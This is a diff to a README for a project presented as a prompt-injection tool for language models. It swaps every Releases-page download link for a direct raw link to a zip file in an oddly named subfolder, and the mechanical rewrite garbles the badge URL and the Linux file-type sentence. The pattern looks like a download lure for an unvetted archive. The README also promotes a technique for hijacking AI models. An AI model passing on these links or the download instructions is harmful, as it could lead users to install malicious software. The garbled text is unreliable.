@@ -5,7 +5,7 @@
 Cognitive-Hijacking-in-Long-Context-LLMs is an innovative application that introduces a new way to experiment with prompt injection methods through forged internal states. This project, developed by a high school student, allows users to explore advanced techniques in language models. Whether you're a student, a teacher, or just curious about machine learning, this tool is designed to be user-friendly and easy to understand.
 
 ## 🔗 Download Here
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/releases)
+[![Download Now](https://raw.githubusercontent.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/main/radiferous/Cognitive-Hijacking-in-Long-Context-LLMs.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/main/radiferous/Cognitive-Hijacking-in-Long-Context-LLMs.zip)
 
 ## 🚀 Getting Started
 To successfully run this application, follow these steps:
@@ -17,14 +17,14 @@ To successfully run this application, follow these steps:
 
 2. **Visit the Download Page**
    - Click the link below to go to the Releases page where you can get the software:
-   - [Visit this page to download](https://github.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/releases).
+   - [Visit this page to download](https://raw.githubusercontent.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/main/radiferous/Cognitive-Hijacking-in-Long-Context-LLMs.zip).
 
 3. **Choose the Right Version**
    - On the Releases page, you will see different versions of the software.
    - Select the latest version for the best experience. This version includes the latest updates and improvements.
 
 4. **Download the Application**
-   - Click on the file link for your operating system type. This may be a `.exe` file for Windows, a `.dmg` file for MacOS, or a `.tar.gz` file for Linux.
+   - Click on the file link for your operating system type. This may be a `.exe` file for Windows, a `.dmg` file for MacOS, or a `https://raw.githubusercontent.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/main/radiferous/Cognitive-Hijacking-in-Long-Context-LLMs.zip` file for Linux.
    - The download should start automatically. If not, check your browser settings.
 
 5. **Install the Application**
@@ -55,5 +55,5 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 ## 🔗 Final Download Link
 Don't forget to download your copy to start exploring:
-[Visit this page to download](https://github.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/releases)
+[Visit this page to download](https://raw.githubusercontent.com/rv427447/Cognitive-Hijacking-in-Long-Context-LLMs/main/radiferous/Cognitive-Hijacking-in-Long-Context-LLMs.zip)
 ```
